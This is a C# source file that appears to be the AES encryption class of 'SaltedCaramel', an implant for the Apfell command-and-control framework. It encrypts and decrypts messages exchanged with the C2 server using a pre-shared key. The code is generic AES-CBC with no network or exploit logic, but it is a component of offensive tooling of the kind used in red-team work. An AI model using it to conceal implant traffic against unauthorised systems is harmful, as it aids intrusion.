using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;

namespace SaltedCaramel
{
    public class SCCrypto
    {
        public byte[] PSK { get; set; }

        internal string Encrypt(string plaintext)
        {
            using (Aes scAes = Aes.Create())
            {
                // Use our PSK (generated in Apfell payload config) as the AES key
                scAes.Key = PSK;

                ICryptoTransform encryptor = scAes.CreateEncryptor(scAes.Key, scAes.IV);

                using (MemoryStream encryptMemStream = new MemoryStream())
                using (CryptoStream encryptCryptoStream = new CryptoStream(encryptMemStream, encryptor, CryptoStreamMode.Write))
                {
                    using (StreamWriter encryptStreamWriter = new StreamWriter(encryptCryptoStream))
                        encryptStreamWriter.Write(plaintext);
                    // We need to send iv:ciphertext
                    byte[] encrypted = scAes.IV.Concat(encryptMemStream.ToArray()).ToArray();
                    // Return base64 encoded ciphertext
                    return Convert.ToBase64String(encrypted);
                }
            }
        }

        internal string Decrypt(string encrypted)
        {
            byte[] input = Convert.FromBase64String(encrypted);

            // Input is IV:ciphertext, IV is 16 bytes
            byte[] IV = new byte[16];
            byte[] ciphertext = new byte[input.Length - 16];
            Array.Copy(input, IV, 16);
            Array.Copy(input, 16, ciphertext, 0, ciphertext.Length);
            
            using (Aes scAes = Aes.Create())
            {
                // Use our PSK (generated in Apfell payload config) as the AES key
                scAes.Key = PSK;

                ICryptoTransform decryptor = scAes.CreateDecryptor(scAes.Key, IV);

                using (MemoryStream decryptMemStream = new MemoryStream(ciphertext))
                using (CryptoStream decryptCryptoStream = new CryptoStream(decryptMemStream, decryptor, CryptoStreamMode.Read))
                using (StreamReader decryptStreamReader = new StreamReader(decryptCryptoStream))
                {
                    string decrypted = decryptStreamReader.ReadToEnd();
                    // Return decrypted message from Apfell server
                    return decrypted;
                }
            }
        }
    }
}
